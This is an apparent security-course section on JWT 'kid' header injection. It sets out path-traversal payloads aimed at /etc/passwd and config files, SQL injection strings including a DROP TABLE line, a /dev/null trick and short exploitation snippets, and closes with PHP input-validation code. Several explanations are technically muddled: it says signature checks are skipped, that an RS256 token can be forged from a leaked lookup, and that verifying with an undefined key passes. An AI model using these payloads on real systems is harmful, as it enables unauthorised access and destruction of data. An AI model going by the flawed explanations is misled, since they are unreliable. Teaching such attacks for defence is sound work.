# 2.3 KID Injection

## Goal

Manipulate Key ID parameter to bypass key lookup validation via path traversal or SQL injection.

---

## How KID Works

KID identifies which key to use for verification:

```json
{
  "alg": "RS256",
  "kid": "key-123"
}
```

Server looks up `key-123` from database. If lookup vulnerable:

```
SELECT key FROM keys WHERE id = 'key-123'
```

**Vulnerability:** Improper input validation in key lookup!

---

## Attack Vectors

### Vector 1: Path Traversal

```json
{"kid": "../../../../etc/passwd"}
{"kid": "../../config.json"}
{"kid": "../../../secrets.txt"}
```

Server might try to read file as key!

### Vector 2: SQL Injection

```json
{"kid": "1' OR '1'='1"}
{"kid": "'; DROP TABLE keys;--"}
{"kid": "1 UNION SELECT 'vulnerable'--"}
```

SQL query executes attacker's code!

### Vector 3: Null/Empty Key

```json
{"kid": "../../../../dev/null"}
```

Key lookup fails → returns nothing → signature validation skipped!

---

## Exploitation Examples

### Path Traversal Attack

```bash
TOKEN_PAYLOAD='{"alg":"RS256","kid":"../config.json"}'
PAYLOAD='{"role":"admin"}'

# Server tries to read ../config.json
# May find secrets or key material
```

### SQL Injection Attack

```python
kid = "1' OR '1'='1"
payload = {"role":"admin","sub":"123"}

# Server query becomes:
# SELECT key FROM users WHERE kid = '1' OR '1'='1'
# Returns first key (always!)
# Can sign token and it validates!
```

### Null File Attack

```python
kid = "../../../../dev/null"
# Key lookup fails
# Function returns None/empty
# Server skips signature validation
# Token accepted regardless of signature!
```

---

## Real-World Scenario

**Target:** Node.js API with HS256

**Code:**
```javascript
const key = keys[req.jwt.kid];
jwt.verify(token, key);
```

**Attack:**
```
Send KID: "../../../../etc/passwd"
Server tries: keys['../../../../etc/passwd']
Returns: undefined
jwt.verify with undefined = BYPASSED
Token accepted!
```

## Prevention

```php
// WRONG: Direct use
$key = $keys[$kid];

// RIGHT: Validate
if (!isset($keys[$kid]) || !is_string($kid)) {
    die('Invalid kid');
}
// Only allow alphanumeric
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $kid)) {
    die('Invalid kid format');
}
$key = $keys[$kid];
```
